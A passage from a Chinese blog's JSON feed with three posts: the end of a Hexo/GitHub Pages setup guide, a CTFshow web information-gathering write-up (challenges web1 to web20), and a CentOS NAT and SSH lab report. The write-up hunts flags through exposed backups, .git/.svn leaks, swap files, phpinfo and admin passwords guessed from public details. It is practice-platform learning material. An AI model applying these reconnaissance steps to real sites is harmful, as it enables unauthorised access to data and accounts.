文件夹里，右键选择 Git Base Here</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$ git config --global user.name “账号”\n$ git config --global user.email “邮箱”<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>输入 ssh-keygen -t rsa -C &quot;你的邮箱&quot;，无脑连续三个回车</p>\n<p>登录 Github，点击头像下的 settings，点击侧边栏 SSH and GPG keys，再点击 Add SSH Key，在 title 处填入任意的标识，在 Key 部分里面添加刚才复制的 id_rsa.pub 文件里的内容，点击添加即可</p>\n<p>输入 ssh -T <span class=\"exturl\" data-url=\"bWFpbHRvOmdpdEBnaXRodWIuY29t\">git@github.com</span>, 出现你的用户名则成功</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007221435449.png\" alt=\"image-20221007221435449\" /></p>\n<h3 id=\"配置deployment\"><a class=\"anchor\" href=\"#配置deployment\">#</a> 配置 Deployment</h3>\n<p>在 blog 目录下，找到_config.yml 文件，修改 repo 值（在末尾）</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">deploy:\n\ttype: git \n\trepository: git@github.com:WShaobin&#x2F;WShaobin.github.io.git\n\tbranch: master<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>repository 值是你在 github 项目里的 ssh（右下角）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007223433959.png\" alt=\"image-20221007223433959\" /></p>\n<h3 id=\"部署到github\"><a class=\"anchor\" href=\"#部署到github\">#</a> 部署到 GitHub</h3>\n<p>右键 git bash here 执行命令： <code>hexo new post “文章”</code>  或 <code>hexo new “文章”</code></p>\n<p>这时候在文件夹_posts 目录下将会看到已经创建的文件</p>\n<p>在生成以及部署文章之前，需要安装一个扩展： <code>npm install hexo-deployer-git --save</code></p>\n<p>使用编辑器编好文章，那么就可以使用命令： <code>hexo d -g</code> ，生成以及部署了</p>\n<p>部署成功后访问你的地址：<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1lcXI5MjRhdnhvLmdpdGh1Yi5pbw==\">http:// 用户名.github.io</span>。那么将看到生成的文章</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007223612104.png\" alt=\"image-20221007223612104\" /></p>\n",
            "tags": [
                "杂记",
                "hexo博客搭建"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "https://blog.xcu.icu/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "CTFshow-web入门信息收集",
            "date_published": "2022-10-24T16:00:00.000Z",
            "content_html": "<h2 id=\"web1\"><a class=\"anchor\" href=\"#web1\">#</a> web1</h2>\n<p>CTRL+u 解决</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111225748.png\" alt=\"image-20221025111225748\" /></p>\n<h2 id=\"web2\"><a class=\"anchor\" href=\"#web2\">#</a> web2</h2>\n<p>同 web1</p>\n<h2 id=\"web3\"><a class=\"anchor\" href=\"#web3\">#</a> web3</h2>\n<p>http 头中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111448297.png\" alt=\"image-20221025111448297\" /></p>\n<h2 id=\"web4\"><a class=\"anchor\" href=\"#web4\">#</a> web4</h2>\n<p>查看 robots.txt</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111605443.png\" alt=\"image-20221025111605443\" /></p>\n<p>访问 /flagishere.txt</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111744010.png\" alt=\"image-20221025111744010\" /></p>\n<h2 id=\"web5\"><a class=\"anchor\" href=\"#web5\">#</a> web5</h2>\n<p>访问 phps 下载源码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112204400.png\" alt=\"image-20221025112204400\" /></p>\n<h2 id=\"web6\"><a class=\"anchor\" href=\"#web6\">#</a> web6</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112528587.png\" alt=\"image-20221025112528587\" /></p>\n<p>有 www.zip, 下载拿到 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112615777.png\" alt=\"image-20221025112615777\" /></p>\n<h2 id=\"web7\"><a class=\"anchor\" href=\"#web7\">#</a> web7</h2>\n<p>git 的源码泄露，直接访问.git/index.php</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113123637.png\" alt=\"image-20221025113123637\" /></p>\n<h2 id=\"web8\"><a class=\"anchor\" href=\"#web8\">#</a> web8</h2>\n<p>svn 源码泄露同上</p>\n<h2 id=\"web9\"><a class=\"anchor\" href=\"#web9\">#</a> web9</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113301899.png\" alt=\"image-20221025113301899\" /></p>\n<p>修改文件时意外退出，生成缓存文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113436950.png\" alt=\"image-20221025113436950\" /></p>\n<h2 id=\"web10\"><a class=\"anchor\" href=\"#web10\">#</a> web10</h2>\n<p>查看 http 头部的 cookie 头</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025123327299.png\" alt=\"image-20221025123327299\" /></p>\n<h2 id=\"web11\"><a class=\"anchor\" href=\"#web11\">#</a> web11</h2>\n<p>域名 dns 解析，设置说明</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025123858205.png\" alt=\"image-20221025123858205\" /></p>\n<h2 id=\"web12\"><a class=\"anchor\" href=\"#web12\">#</a> web12</h2>\n<p>robots.txt 中写了后台登录连接</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124214192.png\" alt=\"image-20221025124214192\" /></p>\n<p>用户名 admin</p>\n<p>密码，页面上的手机号<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124407329.png\" alt=\"image-20221025124407329\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124438975.png\" alt=\"image-20221025124438975\" /></p>\n<h2 id=\"web13\"><a class=\"anchor\" href=\"#web13\">#</a> web13</h2>\n<p>页面下方发现这个 pd 能下载</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124750410.png\" alt=\"image-20221025124750410\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124715623.png\" alt=\"image-20221025124715623\" /></p>\n<p>pdf 中有密码，去尝试登录，拿到 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124945280.png\" alt=\"image-20221025124945280\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125023387.png\" alt=\"image-20221025125023387\" /></p>\n<h2 id=\"web14\"><a class=\"anchor\" href=\"#web14\">#</a> web14</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125246077.png\" alt=\"image-20221025125246077\" /></p>\n<p>去访问，有一个文本编辑器页面，寻找 flag 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125742752.png\" alt=\"image-20221025125742752\" /></p>\n<p>访问文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125808264.png\" alt=\"image-20221025125808264\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125522527.png\" alt=\"image-20221025125522527\" /></p>\n<h2 id=\"web15\"><a class=\"anchor\" href=\"#web15\">#</a> web15</h2>\n<p>发现有 admin 页面，先去访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130005877.png\" alt=\"image-20221025130005877\" /></p>\n<p>有登录页面，但是不知道密码，忘记密码需要知道地址</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130113047.png\" alt=\"image-20221025130113047\" /></p>\n<p>主页找到了邮箱地址</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130224266.png\" alt=\"image-20221025130224266\" /></p>\n<p>通过 qq 号查询地址</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130433834.png\" alt=\"image-20221025130433834\" /></p>\n<p>这里应该是机器人资料改了，题目没更新，正确地址是西安</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130628154.png\" alt=\"image-20221025130628154\" /></p>\n<p>登录拿到 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130719590.png\" alt=\"image-20221025130719590\" /></p>\n<h2 id=\"web16\"><a class=\"anchor\" href=\"#web16\">#</a> web16</h2>\n<p>访问 tz.php,php 探针是用来探测空间、服务器运行状况和 PHP 信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131257496.png\" alt=\"image-20221025131257496\" /></p>\n<p>打开 phpinfo 拿到 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131333881.png\" alt=\"image-20221025131333881\" /></p>\n<h2 id=\"web17\"><a class=\"anchor\" href=\"#web17\">#</a> web17</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131929374.png\" alt=\"image-20221025131929374\" /></p>\n<p>访问，将下载的文件打开拿到 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025132102118.png\" alt=\"image-20221025132102118\" /></p>\n<h2 id=\"web18\"><a class=\"anchor\" href=\"#web18\">#</a> web18</h2>\n<p>前端的验证，查看 js</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145134964.png\" alt=\"image-20221025145134964\" /></p>\n<p>分数大于 100 分会有弹窗，url 解码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145209107.png\" alt=\"image-20221025145209107\" /></p>\n<p>访问 110.php</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145237831.png\" alt=\"image-20221025145237831\" /></p>\n<h2 id=\"web19\"><a class=\"anchor\" href=\"#web19\">#</a> web19</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145332644.png\" alt=\"image-20221025145332644\" /></p>\n<p>看到用户名密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145912834.png\" alt=\"image-20221025145912834\" /></p>\n<p>登陆，拿到 flag</p>\n<h2 id=\"web20\"><a class=\"anchor\" href=\"#web20\">#</a> web20</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150253122.png\" alt=\"image-20221025150253122\" /></p>\n<p>这个目录下有东西，mdb 文件是早期 asp+access 构架的数据库文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150409063.png\" alt=\"image-20221025150409063\" /></p>\n<p>访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150541323.png\" alt=\"image-20221025150541323\" /></p>\n",
            "tags": [
                "CTFshow",
                "信息收集"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/",
            "url": "https://blog.xcu.icu/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/",
            "title": "nat模式+ip分配",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"实验1centos-8安装-网络配置-远程访问\"><a class=\"anchor\" href=\"#实验1centos-8安装-网络配置-远程访问\">#</a> 实验 1：CentOS 8 安装、网络配置、远程访问</h2>\n<p><strong>实验目的</strong></p>\n<blockquote>\n<p>1、掌握 Linux 虚拟机的安装方法；</p>\n<p>2、掌握 Linux 网络配置方法；</p>\n<p>3、掌握远程访问 Linux 系统的方式。</p>\n</blockquote>\n<h3 id=\"1实验要求\"><a class=\"anchor\" href=\"#1实验要求\">#</a> 1. 实验要求</h3>\n<blockquote>\n<p>任务 1：安装虚拟机；（实验过程可以省略）<br />\n任务 2：安装 CentOS 8（建议：最小化安装）； （安装成功后的截图即可）</p>\n<p>任务 3：配置网络为 NAT 模式，实现物理机与虚拟机的相互访问。（要求：IP 地址段为学号后两位，即 192.168. 学号.**）<br />\n（1）\t虚拟机配置为动态 IP 地址，Ping 物理主机测试连通性。</p>\n<p>（2）\t虚拟机配置为静态 IP 地址，Ping 物理主机测试连通性。</p>\n<p>任务 4：Windows 主机上安装 Xhell，实现远程访问 CentOS 8 系统。</p>\n<p>任务 5：两台 Linux 相互登陆（可以克隆出另一台 CentOS8，也可以使用其他的 Linux)。参考《跟阿铭学 Linux  第 3 版.pdf》P45，3.3 节 两台 Linux 相互登陆。</p>\n<p>任务 6：完成后，虚拟机 “拍快照” 保存当前状态。（实验过程可以省略）</p>\n</blockquote>\n<h3 id=\"2实验过程\"><a class=\"anchor\" href=\"#2实验过程\">#</a> 2. 实验过程</h3>\n<h4 id=\"21-安装centos-8\"><a class=\"anchor\" href=\"#21-安装centos-8\">#</a> 2.1 安装 CentOS 8</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2lzb3JlZGlyZWN0LmNlbnRvcy5vcmcvY2VudG9zLzcvaXNvcy94ODZfNjQv\">CentOS Mirrors List</span></p>\n<p>用上面的链接下载镜像，并安装</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzA4MjM4NjYucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914230823866.png</span>&quot; alt=&quot;image-20220914230823866&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<h4 id=\"22-配置网络为nat模式\"><a class=\"anchor\" href=\"#22-配置网络为nat模式\">#</a> 2.2 配置网络为 NAT 模式</h4>\n<h5 id=\"1虚拟机配置为动态ip地址\"><a class=\"anchor\" href=\"#1虚拟机配置为动态ip地址\">#</a> （1）虚拟机配置为动态 IP 地址</h5>\n<ol>\n<li>\n<p>点击 vm 编辑，点击虚拟网络编辑器</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzI3MTkzNDAucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914232719340.png</span>&quot; alt=&quot;image-20220914232719340&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n</li>\n<li>\n<p>发现需要管理员特权才能更改，点击更改设置</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzI4NDgxODcucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914232848187.png</span>&quot; alt=&quot;image-20220914232848187&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n</li>\n<li>\n<p>进入后，选择 VMnet8，选择 NAT 模式，开启 DHCP，将子网 ip 网段改成我的学号后两位 09，最后点击确定</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzM0MDk1NTEucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914233409551.png</span>&quot; alt=&quot;image-20220914233409551&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n</li>\n<li>\n<p>等待加载完成后，查看虚拟网卡的 IP</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzM5MjA5MjUucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914233920925.png</span>&quot; alt=&quot;image-20220914233920925&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n</li>\n<li>\n<p>查看虚拟机 ip，这里发现 ip 地址的网段没有更改，重启后也没有改变</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQwMTgxMzAucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234018130.png</span>&quot; alt=&quot;image-20220914234018130&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n</li>\n<li>\n<p>这里发现物理主机的网段也是 0，判断应该是这台 Linux 虚拟机的网络链接模式还是桥接没有改成 NAT</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQxNTUwMjQucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234155024.png</span>&quot; alt=&quot;image-20220914234155024&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n</li>\n<li>\n<p>查看本 Linux 设置中的网络适配器，发现是桥接模式，这里更改为 NAT</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQ0MjM3NTcucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234423757.png</span>&quot; alt=&quot;image-20220914234423757&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>更改完成重新启动虚拟机，查看 ip 地址，网段变更一致</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQ1MjUxMTIucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234525112.png</span>&quot; alt=&quot;image-20220914234525112&quot; style=&quot;zoom: 80%;&quot; /&gt;</p>\n</li>\n<li>\n<p>测试 Linux 和主机的连通性</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234633267.png\" alt=\"image-20220914234633267\" /></p>\n</li>\n</ol>\n<h5 id=\"2虚拟机配置为静态ip地址\"><a class=\"anchor\" href=\"#2虚拟机配置为静态ip地址\">#</a> （2）虚拟机配置为静态 IP 地址</h5>\n<ol>\n<li>\n<p>进入 /etc/sysconfig/network-scripts/ 目录打开网卡配置文件 ifcfg-ens33</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzU1MDI0MDcucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914235502407.png</span>&quot; alt=&quot;image-20220914235502407&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>打开后输入 i 进入插入模式，更改网卡配置文件</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDAzMTI3NTgucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000312758.png</span>&quot; alt=&quot;image-20220915000312758&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">BOOTPROTO&#x3D;&quot;static&quot;       &#x2F;&#x2F;修改：将dhcp修改为static，修改后为BOOTPROTO&#x3D;static\nONBOOT&#x3D;yes               &#x2F;&#x2F;修改为yes, 网卡开机自启动\n\nIPADDR&#x3D;&quot;xxx.xxx.xxx.xxx&quot;    &#x2F;&#x2F;新增：配置静态IP地址，按需配置\nNETMASK&#x3D;&quot;255.xxx.xxx.xxx&quot;   &#x2F;&#x2F;新增：配置子网掩码\nGATEWAY&#x3D;&quot;xxx.xxx.xxx.xxx&quot;   &#x2F;&#x2F;新增：配置网关\nDNS1&#x3D;&quot;xxx.xxx.xxx.xxx&quot;        &#x2F;&#x2F;新增：配置DNS<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n<li>\n<p>点击 Esc，键入:wq 保存并退出，重启网卡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000632584.png\" alt=\"image-20220915000632584\" /></p>\n</li>\n<li>\n<p>再次查看虚拟机的 IP 地址，发现更改成功</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDA3MDk1NzYucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000709576.png</span>&quot; alt=&quot;image-20220915000709576&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>测试 Linux 和主机的连通性</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000755532.png\" alt=\"image-20220915000755532\" /></p>\n</li>\n</ol>\n<h4 id=\"23-远程访问centos-7系统\"><a class=\"anchor\" href=\"#23-远程访问centos-7系统\">#</a> 2.3 远程访问 CentOS 7 系统</h4>\n<ol>\n<li>\n<p>点击 session</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDExMDQ3NzgucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001104778.png</span>&quot; alt=&quot;image-20220915001104778&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n</li>\n<li>\n<p>选择 ssh，输入 IP 地址，主机名</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDExNTMzOTUucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001153395.png</span>&quot; alt=&quot;image-20220915001153395&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n</li>\n<li>\n<p>点击 ok 后，键入密码</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDEzMzQ3MjUucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001334725.png</span>&quot; alt=&quot;image-20220915001334725&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n</ol>\n<h4 id=\"24-两台linux密钥登陆\"><a class=\"anchor\" href=\"#24-两台linux密钥登陆\">#</a> 2.4 两台 Linux 密钥登陆</h4>\n<ol>\n<li>\n<p>关闭虚拟机，创建一个克隆</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDIwMTE4OTcucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002011897.png</span>&quot; alt=&quot;image-20220915002011897&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>打开两台虚拟机，查看克隆机的 ip 地址</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDIxMjg0ODUucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002128485.png</span>&quot; alt=&quot;image-20220915002128485&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>这里更改网卡配置，使得两个虚拟机的 IP 地址不同</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDI1NTQyMDAucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002554200.png</span>&quot; alt=&quot;image-20220915002554200&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n</li>\n<li>\n<p>同样使用 MobaXterm 连接</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDI4NDgwOTQucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002848094.png</span>&quot; alt=&quot;image-20220915002848094&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>使用 ssh-keygen 命令生成密钥对儿</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMTM4MTY2MDIucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915013816602.png</span>&quot; alt=&quot;image-20220915013816602&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>将公钥 /root/.ssh/id_rsa.pub 的内容存入另一台虚拟机的 /root/.ssh/authorized_keys</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMTQxMTg0ODEucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915014118481.png</span>&quot; alt=&quot;image-20220915014118481&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>便可以直接登录，相互登录实现</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915015619902.png\" alt=\"image-20220915015619902\" /></p>\n</li>\n</ol>\n<h4 id=\"25-使用快照保存当前状态\"><a class=\"anchor\" href=\"#25-使用快照保存当前状态\">#</a> 2.5 使用快照保存当前状态</h4>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001507112.png\" alt=\"image-20220915001507112\" /></p>\n<h3 id=\"3实验小结\"><a class=\"anchor\" href=\"#3实验小结\">#</a> 3. 实验小结</h3>\n<p>经过本次实验，学会了 nat 模式下的动态 ip 和静态 ip 地址的配置，加深了我对桥接和 nat 两种模式的理解，区分了虚拟网卡和物理网卡的联系和区别，学到了两台 Linux 主机的免密登录方式</p>\n",
            "tags": [
                "网络服务应用",
                "nat ip分配"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/",
